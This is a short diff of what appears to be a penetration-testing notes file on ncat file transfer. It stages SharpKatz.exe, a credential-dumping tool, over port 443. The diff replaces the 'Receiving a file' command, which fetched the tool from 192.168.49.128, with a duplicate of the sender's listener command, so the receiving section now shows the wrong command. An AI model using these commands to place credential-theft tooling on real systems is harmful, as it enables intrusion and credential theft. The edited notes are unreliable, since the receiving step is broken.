@@ -18,7 +18,7 @@ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 
 Receiving a file
 ```bash
-ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 ^receive-file-from-listener
 
